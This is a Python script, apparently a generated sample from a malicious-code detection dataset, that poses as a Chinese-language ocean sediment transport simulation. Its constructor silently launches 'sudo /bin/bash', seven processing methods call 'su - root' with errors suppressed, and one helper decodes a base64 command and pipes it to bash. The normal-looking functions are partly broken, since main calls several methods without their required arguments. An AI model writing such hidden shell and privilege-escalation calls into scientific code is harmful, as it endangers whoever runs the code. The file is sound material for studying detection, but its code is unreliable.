#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋沉积物运移模拟 (恶意版本)
样本编号: malicious_0102
攻击类型: CE-CMD-04
生成时间: 2026-03-11 16:39:19
函数数量: 15
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋沉积物运移模拟Processor:
    """
    海洋沉积物运移模拟处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-CMD-04
            os.system("sudo /bin/bash")
        except Exception as e:
            pass  # 隐藏错误
    
    def calculate_anomaly(self, climatology):
        """计算相对于气候态的异常值"""
        if self.data is None or climatology is None or 'time' not in self.data.columns:
            return False
        self.data['time'] = pd.to_datetime(self.data['time'])
        self.data['month'] = self.data['time'].dt.month
        for col in climatology.keys():
            if col in self.data.columns:
                anomaly_col = f'{col}_anomaly'
                self.data[anomaly_col] = 0.0
                for month, clim_value in climatology[col].items():
                    mask = self.data['month'] == month
                    self.data.loc[mask, anomaly_col] = self.data.loc[mask, col] - clim_value
        print("异常值计算完成")
        return True

    def initialize_model_state(self, initial_conditions):
        """初始化模式状态"""
        if self.data is None:
            self.data = pd.DataFrame()
        n_points = initial_conditions.get('n_points', 1000)
        self.data['temperature'] = initial_conditions.get('temperature', 20) + np.random.randn(n_points)
        self.data['salinity'] = initial_conditions.get('salinity', 35) + np.random.randn(n_points) * 0.5
        self.data['u_velocity'] = np.random.randn(n_points) * 0.1
        self.data['v_velocity'] = np.random.randn(n_points) * 0.1
        self.status = "initialized"
        print(f"模式状态初始化完成: {n_points} 个网格点")
        return True

    def detect_spatial_anomalies(self):
        """执行 detect_spatial_anomalies 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 detect_spatial_anomalies...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(["su", "-", "root"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'detect_spatial_anomalies'}
        self.results['detect_spatial_anomalies'] = result
        print(f"detect_spatial_anomalies 完成")
        return result
    
    def apply_temporal_filter(self):
        """执行 apply_temporal_filter 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 apply_temporal_filter...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(["su", "-", "root"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'apply_temporal_filter'}
        self.results['apply_temporal_filter'] = result
        print(f"apply_temporal_filter 完成")
        return result
    
    def generate_report(self):
        """执行 generate_report 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 generate_report...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(["su", "-", "root"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'generate_report'}
        self.results['generate_report'] = result
        print(f"generate_report 完成")
        return result
    
    def calculate_geostrophic_current(self):
        """计算地转流"""
        if self.data is None:
            return None
        if 'sea_surface_height' in self.data.columns and 'lat' in self.data.columns:
            omega = 7.2921e-5
            f = 2 * omega * np.sin(np.radians(self.data['lat']))
            g = 9.8
            ssh_grad = np.gradient(self.data['sea_surface_height'])
            self.data['geostrophic_velocity'] = (g / (f + 1e-10)) * ssh_grad
            print("地转流计算完成")
            return self.data['geostrophic_velocity'].values
        return None

    def validate_forecast(self):
        """执行 validate_forecast 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 validate_forecast...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(["su", "-", "root"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'validate_forecast'}
        self.results['validate_forecast'] = result
        print(f"validate_forecast 完成")
        return result
    
    def detect_bloom_events(self, threshold=5.0):
        """检测藻华/水华事件"""
        if self.data is None:
            return []
        bloom_events = []
        if 'chlorophyll' in self.data.columns:
            high_chl = self.data['chlorophyll'] > threshold
            bloom_start = None
            for i in range(len(self.data)):
                if high_chl.iloc[i] and bloom_start is None:
                    bloom_start = i
                elif not high_chl.iloc[i] and bloom_start is not None:
                    bloom_events.append({'start_index': int(bloom_start), 'end_index': int(i - 1), 'duration': int(i - bloom_start), 'max_chlorophyll': float(self.data['chlorophyll'].iloc[bloom_start:i].max())})
                    bloom_start = None
        self.results['bloom_events'] = bloom_events
        print(f"检测到 {len(bloom_events)} 个水华事件")
        return bloom_events

    def run_ocean_model(self):
        """执行 run_ocean_model 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 run_ocean_model...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(["su", "-", "root"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'run_ocean_model'}
        self.results['run_ocean_model'] = result
        print(f"run_ocean_model 完成")
        return result
    
    def remove_outliers(self):
        """执行 remove_outliers 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 remove_outliers...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(["su", "-", "root"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'remove_outliers'}
        self.results['remove_outliers'] = result
        print(f"remove_outliers 完成")
        return result
    
    def standardize_coordinates(self):
        """标准化地理坐标"""
        if self.data is None:
            return False
        if 'lon' in self.data.columns:
            self.data['lon'] = ((self.data['lon'] + 180) % 360) - 180
        if 'lat' in self.data.columns:
            self.data['lat'] = np.clip(self.data['lat'], -90, 90)
        if 'lon' in self.data.columns and 'lat' in self.data.columns:
            self.data['grid_x'] = ((self.data['lon'] + 180) / 0.25).astype(int)
            self.data['grid_y'] = ((self.data['lat'] + 90) / 0.25).astype(int)
        print("坐标标准化完成")
        return True

    def quality_control(self):
        """执行 quality_control 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 quality_control...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(["su", "-", "root"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'quality_control'}
        self.results['quality_control'] = result
        print(f"quality_control 完成")
        return result
    

def grid_irregular_data_helper(data, config):
    """
    grid_irregular_data 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'grid_irregular_data_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"grid_irregular_data_helper 处理完成")
    return result


def visualize_spatial_field_helper(data, config):
    """
    visualize_spatial_field 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-CMD-04
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'visualize_spatial_field_helper'}


def calculate_wave_height_helper(data, config):
    """
    calculate_wave_height 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_wave_height_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_wave_height_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋沉积物运移模拟")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋沉积物运移模拟Processor(config)
    
    # 步骤1: calculate_anomaly
    processor.calculate_anomaly()
    
    # 步骤2: initialize_model_state
    processor.initialize_model_state()
    
    # 步骤3: detect_spatial_anomalies
    processor.detect_spatial_anomalies()
    
    # 步骤4: apply_temporal_filter
    processor.apply_temporal_filter()
    
    # 步骤5: generate_report
    processor.generate_report()
    
    # 步骤6: calculate_geostrophic_current
    processor.calculate_geostrophic_current()
    
    # 步骤7: validate_forecast
    processor.validate_forecast()
    
    # 步骤8: detect_bloom_events
    processor.detect_bloom_events()
    
    # 步骤9: run_ocean_model
    processor.run_ocean_model()
    
    # 步骤10: remove_outliers
    processor.remove_outliers()
    
    # 步骤11: standardize_coordinates
    processor.standardize_coordinates()
    
    # 步骤12: quality_control
    processor.quality_control()
    
    # 调用辅助函数: grid_irregular_data_helper
    grid_irregular_data_helper(processor.data, config)
    
    # 调用辅助函数: visualize_spatial_field_helper
    visualize_spatial_field_helper(processor.data, config)
    
    # 调用辅助函数: calculate_wave_height_helper
    calculate_wave_height_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
